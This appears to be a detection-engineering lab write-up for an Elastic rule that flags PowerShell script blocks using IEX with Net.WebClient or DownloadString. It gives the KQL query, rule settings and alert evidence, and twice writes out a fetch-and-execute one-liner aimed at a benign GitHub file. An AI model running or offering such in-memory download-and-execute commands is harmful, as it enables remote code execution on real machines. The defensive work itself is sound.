# PowerShell IEX DownloadString Execution

Detects PowerShell scripts that use **Invoke-Expression (IEX)** with **Net.WebClient** or **DownloadString** to download and execute code directly in memory, a common technique used by attackers to avoid writing files to disk.

---

## Objective

Create a custom Elastic Detection Rule to identify PowerShell script blocks that use **IEX** together with **Net.WebClient** or **DownloadString**, techniques commonly associated with in-memory malware execution.

---

## MITRE ATT&CK

| Tactic | Technique |
|---------|-----------|
| Execution | T1059.001 – PowerShell |

---

## Detection Logic

The rule looks for PowerShell Script Block Logging events (**Event ID 4104**) containing:

- `IEX`
- `Net.WebClient`
- `DownloadString`

Using Script Block Logging makes this detection more reliable because it captures the actual PowerShell code being executed rather than only the process command line.

### KQL

```kql
event.dataset:"windows.powershell_operational" and
event.code:4104 and
powershell.file.script_block_text:*IEX* and
(
    powershell.file.script_block_text:*Net.WebClient* or
    powershell.file.script_block_text:*DownloadString*
)
```

---

## Detection Rule Configuration

| Setting | Value |
|---------|-------|
| Rule Type | Custom Query |
| Severity | Medium |
| Risk Score | 50 |
| Index Pattern | logs-* |
| Schedule | Every 1 minute |
| Look-back Time | 2 minutes |

---

## Lab Environment

| Component | Version |
|-----------|---------|
| Windows | Windows 10 Pro |
| Elastic Stack | 8.12.0 |
| Elastic Agent | 8.12.2 |
| Sysmon | Installed |
| Data Source | Microsoft-Windows-PowerShell/Operational |

---

## Attack Simulation

Executed the following PowerShell command:

```powershell
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/octocat/Hello-World/master/README")
```

Although the downloaded content was benign and generated an error after execution, the objective was to verify that the detection rule successfully identified the attack technique.

---

## Raw Event Evidence

### Event ID

```
4104
```

### Provider

```
Microsoft-Windows-PowerShell
```

### Event Action

```
Execute a Remote Command
```

### Script Block

```powershell
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/octocat/Hello-World/master/README")
```

### User

```
gamal
```

### Host

```
DESKTOP-0DFKSAT
```

---

## Alert Generated

The rule successfully generated a **Medium Severity** security alert after the script block was executed.

Alert Details:

- Rule Name: **PowerShell IEX DownloadString Execution**
- Severity: Medium
- Risk Score: 50

---

## Investigation

During the investigation, the following fields were reviewed:

- `powershell.file.script_block_text`
- `event.code`
- `user.name`
- `host.name`
- `process.entity_id`
- `winlog.process.pid`

Additional Sysmon telemetry confirmed that the PowerShell process also performed:

- DNS lookup to `raw.githubusercontent.com`
- HTTPS network connection over port **443**

This demonstrates how PowerShell Operational logs and Sysmon events can be correlated to reconstruct attacker activity.

---

## Detection Outcome

✅ Detection Successful

The rule successfully detected the execution of an **IEX + DownloadString** PowerShell script using **Script Block Logging (Event ID 4104)** and generated a Security Alert in Elastic Security.

---

